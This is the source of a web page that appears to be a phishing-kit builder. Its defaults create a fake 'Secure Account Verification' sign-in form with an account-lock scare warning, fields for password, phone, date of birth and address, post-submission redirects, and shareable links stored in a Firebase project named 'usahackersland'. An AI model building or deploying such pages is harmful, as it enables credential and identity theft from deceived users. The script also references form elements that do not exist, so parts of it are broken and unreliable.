<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>üé® COMPLETE FINAL</title>
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;padding:18px;margin:0}
.wrap{max-width:1200px;margin:auto;background:#fff;padding:18px;border-radius:10px;box-sizing:border-box}
label{display:block;margin-top:10px;font-weight:700}
input,textarea,select,button{width:100%;padding:8px;margin-top:6px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
textarea{min-height:70px}
.row{display:flex;gap:10px;flex-wrap:wrap}
.col{flex:1;min-width:150px}
.btn{background:#1976d2;color:#fff;border:none;padding:10px;border-radius:6px;cursor:pointer}
.btn.alt{background:#6c757d}
.previewWrap{border:1px solid #ddd;border-radius:8px;padding:8px;margin-top:10px;background:#fff;overflow:auto}
#preview{position:relative;min-height:520px;height:75vh;overflow:auto}
.galleryImg{max-width:100%;margin:6px 0;border-radius:6px}
.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}
@media(max-width:768px){.wrap{padding:12px}.row{flex-direction:column}.col{min-width:100%}}
</style>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>
<div class="wrap">
<h2>üé® COMPLETE FORM BUILDER</h2>

<div style="display:flex;gap:18px;flex-wrap:wrap">
<div style="flex:1;min-width:340px">

<label>SEO Page Title</label><input id="seoTitle" value="Secure Account Verification">
<label>Meta Description</label><textarea id="metaDesc">Verify your account to continue securely</textarea>
<label>OG Image URL</label><input id="ogImage" value="https://example.com/og-image.png">

<label>Avatar Image URL</label><input id="avatarURL" value="https://i.pravatar.cc/150">
<label>Logo Image URL</label><input id="logoURL" value="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_TV_2015.png">
<label>Banner Image URL</label><input id="bannerURL" value="https://picsum.photos/800/300">

<label>Page Title</label><input id="title" value="Welcome Back">
<label>Title Color</label><input type="color" id="titleColor" value="#111111">
<label>Subtitle</label><input id="subtitle" value="Please sign in to continue">
<label>Subtitle Color</label><input type="color" id="subtitleColor" value="#555555">
<label>Description Text</label><textarea id="description">This verification helps keep your account safe.</textarea>

<label>Gallery Images (comma separated)</label><textarea id="galleryImages">https://picsum.photos/200/150,https://picsum.photos/201/150</textarea>
<label>Videos (comma separated)</label><textarea id="videoLinks">https://www.youtube.com/watch?v=dQw4w9WgXcQ</textarea>

<label>Background Image URL</label><input id="bgImageURL" value="https://picsum.photos/1200/800">
<label>Background Size</label><input id="bgSize" value="cover">
<label>Text Color</label><input type="color" id="textColor" value="#222222">
<label>Background Color</label><input type="color" id="bgColor" value="#ffffff">

<label><input type="checkbox" id="enableWarning" checked> Show Warning</label>
<textarea id="warning">‚ö†Ô∏è Failure to verify may result in account lock!</textarea>
<label><input type="checkbox" id="enableWarningPosition" checked> Customize Warning Position</label>
<select id="warningPosition">
<option value="normal">Normal</option>
<option value="left">Left</option>
<option value="center">Center</option>
<option value="right">Right</option>
<option value="none">None</option>
</select>

<label><input type="checkbox" id="addAuth" checked> Include Username & Password</label>
<input id="usernamePlaceholder" value="Email or Username">
<input id="passwordPlaceholder" value="Password">

<label>Extra Fields (one per line)</label>
<textarea id="extraFields">
Phone Number
Date of Birth
Address
</textarea>

<h3>Embed Links (Above Main Button)</h3>
<label>Embed Link Text</label><input id="embedText" placeholder="Custom Text">
<label>Embed Link URL</label><input id="embedURL" placeholder="https://example.com">
<label>Embed Description (Optional)</label><input id="embedDesc" placeholder="Short description">
<label><input type="checkbox" id="embedShow" checked> Show this embed link</label>
<div class="row">
<button class="btn" onclick="addEmbedLink()">Add Embed Link</button>
<button class="btn alt" onclick="clearEmbedLinks()">Clear Embed Links</button>
</div>

<h3>Generate Button Settings</h3>
<label>Generate Button Text</label><input id="generateBtnText" value="Generate Form">
<label><input type="checkbox" id="showGenerateBtn" checked> Show Generate Button</label>

<h3>Redirect Settings</h3>
<label><input type="checkbox" id="enableRedirect"> Redirect after submission</label>
<input id="redirectURL" placeholder="https://example.com">

<label>Footer Text</label><input id="footerText" value="¬© 2025 Secure Verification Portal">

<div class="row">
<button class="btn" onclick="generateForm()">Generate</button>
</div>

<div id="linkArea" class="linkBox" style="display:none"></div>
</div>

<!-- PREVIEW -->
<div style="flex:0 0 540px">
<label>Live Preview</label>
<div class="previewWrap"><div id="preview"></div></div>
</div>
</div>
</div>

<script>
const $=id=>document.getElementById(id);
let embedLinks=[];

const firebaseConfig={
  apiKey:"AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain:"usahackersland.firebaseapp.com",
  projectId:"usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db=firebase.firestore();

document.querySelectorAll("input,textarea,select").forEach(e=>{
  e.addEventListener("input",renderPreview);
  e.addEventListener("change",renderPreview);
});

function addEmbedLink(){
  if(!$("embedShow").checked) return;
  embedLinks.push({text:$("embedText").value,url:$("embedURL").value,desc:$("embedDesc").value});
  renderPreview();
}
function clearEmbedLinks(){embedLinks=[];renderPreview();}

function renderPreview(){
  const p=$("preview");
  p.innerHTML="";
  p.style.background=$("bgColor").value;
  if($("bgImageURL").value) p.style.backgroundImage=`url(${$("bgImageURL").value})`;
  p.style.backgroundSize=$("bgSize").value;

  const c=document.createElement("div");
  c.style.padding="16px";
  c.style.color=$("textColor").value;

  // Gallery images
  $("galleryImages").value.split(",").forEach(url=>{
    if(url.trim()){ const img=document.createElement("img"); img.src=url.trim(); img.className="galleryImg"; c.appendChild(img);}
  });

  // Title & subtitle
  const h2=document.createElement("h2"); h2.style.textAlign="center"; h2.style.color=$("titleColor").value; h2.textContent=$("title").value; c.appendChild(h2);
  const sub=document.createElement("p"); sub.style.textAlign="center"; sub.style.color=$("subtitleColor").value; sub.textContent=$("subtitle").value; c.appendChild(sub);

  // Description
  const desc=document.createElement("p"); desc.textContent=$("description").value; c.appendChild(desc);

  // Videos
  $("videoLinks").value.split(",").forEach(v=>{
    const vid=v.trim().split("v=")[1];
    if(vid){ const iframe=document.createElement("iframe"); iframe.width="100%"; iframe.height="180"; iframe.src=`https://www.youtube.com/embed/${vid}`; iframe.frameBorder=0; iframe.allow="fullscreen"; c.appendChild(iframe);}
  });

  // Username & Password
  if($("addAuth").checked){
    const uInput=document.createElement("input"); uInput.placeholder=$("usernamePlaceholder").value; c.appendChild(uInput);
    const pInput=document.createElement("input"); pInput.type="password"; pInput.placeholder=$("passwordPlaceholder").value; c.appendChild(pInput);
  }

  // Extra fields
  $("extraFields").value.split("\n").forEach(f=>{if(f.trim()){ const i=document.createElement("input"); i.placeholder=f.trim(); c.appendChild(i);}});

  // Embed links
  embedLinks.forEach(link=>{
    const div=document.createElement("div"); div.className="embedLink";
    div.innerHTML=`<a href="${link.url}" target="_blank"><strong>${link.text}</strong></a>`;
    if(link.desc) div.innerHTML+=`<br><small>${link.desc}</small>`;
    c.appendChild(div);
  });

  // Buttons
  if($("showMainBtn").checked){
    const btn=document.createElement("button"); btn.textContent=$("buttonText").value; btn.style.background=$("btnColor").value; btn.style.color="#fff";
    btn.onclick=()=>alert('Form "'+$("title").value+'" submitted successfully'); c.appendChild(btn);
  }
  if($("showGenerateBtn").checked){
    const genBtn=document.createElement("button"); genBtn.textContent=$("generateBtnText").value; genBtn.style.background="#1976d2"; genBtn.style.color="#fff";
    genBtn.onclick=()=>generateForm(); c.appendChild(genBtn);
  }

  // Warning
  if($("enableWarning").checked && $("warningPosition").value!=="none"){
    const warn=document.createElement("p"); warn.style.color="#b71c1c"; warn.style.textAlign=$("warningPosition").value; warn.textContent=$("warning").value; c.appendChild(warn);
  }

  // Footer
  const footer=document.createElement("footer"); footer.style.textAlign="center"; footer.style.marginTop="10px"; footer.style.fontSize="12px"; footer.textContent=$("footerText").value; c.appendChild(footer);

  p.appendChild(c);
}

function generateForm(){
  const formData={
    seoTitle:$("seoTitle").value,
    metaDesc:$("metaDesc").value,
    ogImage:$("ogImage").value,
    avatarURL:$("avatarURL").value,
    logoURL:$("logoURL").value,
    bannerURL:$("bannerURL").value,
    title:$("title").value,
    titleColor:$("titleColor").value,
    subtitle:$("subtitle").value,
    subtitleColor:$("subtitleColor").value,
    description:$("description").value,
    galleryImages:$("galleryImages").value.split(",").map(v=>v.trim()).filter(v=>v),
    videoLinks:$("videoLinks").value.split(",").map(v=>v.trim()).filter(v=>v),
    addAuth:$("addAuth").checked,
    usernamePlaceholder:$("usernamePlaceholder").value,
    passwordPlaceholder:$("passwordPlaceholder").value,
    extraFields:$("extraFields").value.split("\n").map(v=>v.trim()).filter(v=>v),
    buttonText:$("buttonText").value,
    btnColor:$("btnColor").value,
    showMainBtn:$("showMainBtn").checked,
    showGenerateBtn:$("showGenerateBtn").checked,
    generateBtnText:$("generateBtnText").value,
    embedLinks:embedLinks,
    enableRedirect:$("enableRedirect").checked,
    redirectURL:$("redirectURL").value,
    footerText:$("footerText").value,
    createdAt:new Date().toISOString()
  };

  db.collection("forms").add(formData).then(docRef=>{
    const link=`${window.location.origin}/form.html?id=${docRef.id}`;
    $("linkArea").style.display="block";
    $("linkArea").innerHTML=`‚úÖ Form saved successfully! <br>Shareable Link: <a href="${link}" target="_blank">${link}</a>`;
    db.collection("forms").doc(docRef.id).update({customLink:link});
  }).catch(err=>{
    $("linkArea").style.display="block";
    $("linkArea").textContent="‚ùå Error saving form: "+err;
  });
}

renderPreview();
</script>
</body>
</html>
